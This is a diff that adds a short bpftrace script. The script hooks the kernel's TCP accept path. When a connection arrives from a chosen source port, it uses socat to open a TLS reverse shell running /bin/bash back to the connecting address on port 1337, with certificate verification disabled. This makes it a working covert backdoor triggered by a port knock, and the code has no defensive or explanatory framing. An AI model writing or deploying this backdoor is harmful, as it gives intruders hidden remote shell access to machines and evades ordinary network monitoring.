@@ -1,0 +1,16 @@
+#include <net/sock.h>
+
+BEGIN { printf("Listening for source port %u...\n", $1); }
+
+kretprobe:inet_csk_accept {
+  $sk = (struct sock *)retval;
+  if ($sk->__sk_common.skc_family != AF_INET) { return; }
+
+  $src_port_tmp = (uint16)$sk->__sk_common.skc_dport;
+  $src_port = (($src_port_tmp >> 8) | (($src_port_tmp << 8) & 0x00FF00));
+
+  if ($src_port != (uint16)$1) { return; }
+
+  $daddr = ntop($sk->__sk_common.skc_daddr);
+  system("socat OPENSSL:%s:1337,verify=0 EXEC:/bin/bash\n", $daddr);
+}
